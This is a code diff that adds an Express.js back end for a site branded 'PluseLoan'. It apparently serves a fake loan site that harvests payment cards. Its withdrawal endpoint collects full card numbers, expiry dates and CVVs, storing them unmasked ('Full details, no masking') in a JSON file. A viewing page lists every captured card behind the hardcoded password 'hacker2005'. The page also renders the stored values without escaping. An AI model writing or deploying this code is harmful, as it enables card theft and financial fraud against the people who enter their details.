@@ -1,0 +1,177 @@
+const express = require('express');
+const fs = require('fs');
+const path = require('path');
+const app = express();
+const port = 3000;
+
+// Middleware to parse JSON bodies and URL-encoded forms
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname, '../'))); // Serve front-end files
+
+// File to store withdrawal data
+const withdrawalsFile = path.join(__dirname, 'withdrawals.json');
+
+// Initialize withdrawals file if it doesn’t exist
+if (!fs.existsSync(withdrawalsFile)) {
+    fs.writeFileSync(withdrawalsFile, JSON.stringify([]));
+}
+
+// POST endpoint to save withdrawal info
+app.post('/api/withdraw', (req, res) => {
+    const { cardholderName, cardNumber, expiry, cvv, loanAmount } = req.body;
+
+    if (!cardholderName || !cardNumber || !expiry || !cvv || !loanAmount) {
+        return res.status(400).json({ error: 'All fields are required' });
+    }
+
+    const withdrawal = {
+        cardholderName,
+        cardNumber, // Full details, no masking
+        expiry,
+        cvv,    // Full details, no masking
+        loanAmount,
+        timestamp: new Date().toISOString()
+    };
+
+    // Read existing data
+    fs.readFile(withdrawalsFile, 'utf8', (err, data) => {
+        if (err) {
+            return res.status(500).json({ error: 'Failed to read data' });
+        }
+
+        const withdrawals = JSON.parse(data);
+        withdrawals.push(withdrawal);
+
+        // Write updated data
+        fs.writeFile(withdrawalsFile, JSON.stringify(withdrawals, null, 2), (err) => {
+            if (err) {
+                return res.status(500).json({ error: 'Failed to save data' });
+            }
+            res.json({ message: 'Withdrawal info saved successfully' });
+        });
+    });
+});
+
+// GET endpoint for withdrawals with password protection
+app.get('/withdrawals', (req, res) => {
+    // If password isn’t provided yet, show a form
+    if (!req.query.password) {
+        res.send(`
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Enter Password</title>
+                <style>
+                    body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f8f8f8; }
+                    .container { background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1); text-align: center; }
+                    input { padding: 8px; margin: 10px 0; width: 200px; border: 1px solid #ddd; border-radius: 5px; }
+                    button { padding: 10px 20px; background: #000; color: #fff; border: none; border-radius: 5px; cursor: pointer; }
+                    button:hover { background: #1a1a1a; }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <h2>Enter Password</h2>
+                    <form action="/withdrawals" method="GET">
+                        <input type="password" name="password" placeholder="Password" required>
+                        <br>
+                        <button type="submit">Submit</button>
+                    </form>
+                </div>
+            </body>
+            </html>
+        `);
+    } else {
+        // Check password
+        if (req.query.password !== 'hacker2005') {
+            return res.send(`
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>Access Denied</title>
+                    <style>
+                        body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f8f8f8; }
+                        .container { background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1); text-align: center; }
+                    </style>
+                </head>
+                <body>
+                    <div class="container">
+                        <h2>Wrong Password</h2>
+                        <p>Try again.</p>
+                        <a href="/withdrawals">Back</a>
+                    </div>
+                </body>
+                </html>
+            `);
+        }
+
+        // Password correct, display withdrawals
+        fs.readFile(withdrawalsFile, 'utf8', (err, data) => {
+            if (err) {
+                return res.status(500).send('Error reading withdrawals data');
+            }
+
+            const withdrawals = JSON.parse(data);
+            let html = `
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>PluseLoan Withdrawals</title>
+                    <style>
+                        body { font-family: Arial, sans-serif; margin: 20px; background: #f8f8f8; }
+                        h1 { text-align: center; color: #000; }
+                        table { width: 100%; max-width: 900px; margin: 20px auto; border-collapse: collapse; }
+                        th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
+                        th { background: #000; color: #fff; }
+                        tr:nth-child(even) { background: #fff; }
+                        tr:nth-child(odd) { background: #f0f0f0; }
+                    </style>
+                </head>
+                <body>
+                    <h1>PluseLoan Withdrawals</h1>
+                    <table>
+                        <tr>
+                            <th>Cardholder Name</th>
+                            <th>Card Number</th>
+                            <th>Expiry</th>
+                            <th>CVV</th>
+                            <th>Loan Amount</th>
+                            <th>Timestamp</th>
+                        </tr>
+            `;
+
+            withdrawals.forEach(w => {
+                html += `
+                    <tr>
+                        <td>${w.cardholderName}</td>
+                        <td>${w.cardNumber}</td>
+                        <td>${w.expiry}</td>
+                        <td>${w.cvv}</td>
+                        <td>$${w.loanAmount}</td>
+                        <td>${w.timestamp}</td>
+                    </tr>
+                `;
+            });
+
+            html += `
+                    </table>
+                </body>
+                </html>
+            `;
+
+            res.send(html);
+        });
+    }
+});
+
+// Start server
+app.listen(port, () => {
+    console.log(`Server running at http://localhost:${port}`);
+});
